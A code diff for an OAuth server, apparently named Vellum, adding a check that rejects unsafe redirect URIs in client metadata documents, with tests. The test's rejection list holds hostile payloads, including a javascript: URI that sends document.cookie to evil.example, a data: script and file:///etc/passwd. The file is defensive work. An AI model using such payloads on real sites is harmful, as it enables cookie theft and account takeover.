@@ -117,6 +117,25 @@ impl Client {
     }
 }
 
+/// Whether a redirect URI from a client metadata document is safe to send
+/// a browser and an authorization code to: https, http on a loopback
+/// address (RFC 8252 §7.3), or a private-use app scheme in reverse-domain
+/// form (RFC 8252 §7.1). Anything else, such as `javascript:`, `data:` or
+/// plain http to another host, is refused.
+fn safe_redirect(uri: &str) -> bool {
+    let Ok(url) = Url::parse(uri) else {
+        return false;
+    };
+    if url.fragment().is_some() {
+        return false;
+    }
+    match url.scheme() {
+        "https" => url.host().is_some(),
+        "http" => is_loopback(&url),
+        scheme => scheme.contains('.'),
+    }
+}
+
 fn is_loopback(url: &Url) -> bool {
     match url.host() {
         Some(url::Host::Ipv4(ip)) => ip.is_loopback(),
@@ -384,6 +403,12 @@ impl Identity {
         }
         if doc.redirect_uris.is_empty() {
             return Err(bad("the metadata document lists no redirect URIs"));
+        }
+        if let Some(unsafe_uri) = doc.redirect_uris.iter().find(|u| !safe_redirect(u)) {
+            return Err(bad(&format!(
+                "the redirect URI `{unsafe_uri}` must be https, http on a loopback address, \
+                 or an app scheme such as com.example.app"
+            )));
         }
         let name = doc
             .client_name
@@ -838,6 +863,73 @@ mod tests {
         };
         assert!(web.allows_redirect("https://app.example/cb"));
         assert!(!web.allows_redirect("https://app.example:444/cb"));
+    }
+
+    /// Serves one fixed client metadata document.
+    struct Document(String);
+
+    impl ClientMetadataFetcher for Document {
+        fn fetch<'a>(&'a self, _url: &'a str) -> BoxFuture<'a, Result<Vec<u8>, Error>> {
+            let body = self.0.clone().into_bytes();
+            Box::pin(async move { Ok(body) })
+        }
+    }
+
+    fn identity_serving(redirect_uri: &str) -> Identity {
+        let dir = std::env::temp_dir().join(format!(
+            "vellum-oauth-{}-{}",
+            std::process::id(),
+            redirect_uri.len()
+        ));
+        let store = crate::store::Store::open(&dir).unwrap();
+        let config =
+            crate::identity::IdentityConfig::new(Url::parse("https://vellum.example").unwrap());
+        let doc = json!({
+            "client_id": "https://app.example/client.json",
+            "client_name": "App",
+            "redirect_uris": [redirect_uri],
+        });
+        Identity::new(config, store)
+            .with_metadata_fetcher(std::sync::Arc::new(Document(doc.to_string())))
+    }
+
+    fn request(redirect_uri: &str) -> AuthorizeRequest {
+        serde_json::from_value(json!({
+            "client_id": "https://app.example/client.json",
+            "redirect_uri": redirect_uri,
+            "response_type": "code",
+            "code_challenge": "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM",
+            "code_challenge_method": "S256",
+        }))
+        .unwrap()
+    }
+
+    // A metadata document is written by whoever hosts it. The consent page
+    // sends the browser to its redirect URI with `location.assign`, so a
+    // `javascript:` URI would run in Vellum's origin, and a plain-http one
+    // would send the code in clear text (#386).
+    #[tokio::test]
+    async fn metadata_clients_may_only_redirect_to_safe_uris() {
+        for bad in [
+            "javascript:fetch('//evil.example/?'+document.cookie)//",
+            "data:text/html,<script>alert(1)</script>",
+            "http://evil.example/cb",
+            "file:///etc/passwd",
+            "nodots:/cb",
+        ] {
+            let identity = identity_serving(bad);
+            let outcome = identity.authorize(UserId::generate(), &request(bad)).await;
+            assert!(matches!(outcome, Authorize::Fail(_)), "{bad} was accepted");
+        }
+        for good in [
+            "https://app.example/cb",
+            "http://127.0.0.1:4000/cb",
+            "com.example.app:/oauth/cb",
+        ] {
+            let identity = identity_serving(good);
+            let outcome = identity.authorize(UserId::generate(), &request(good)).await;
+            assert!(!matches!(outcome, Authorize::Fail(_)), "{good} was refused");
+        }
     }
 
     #[test]
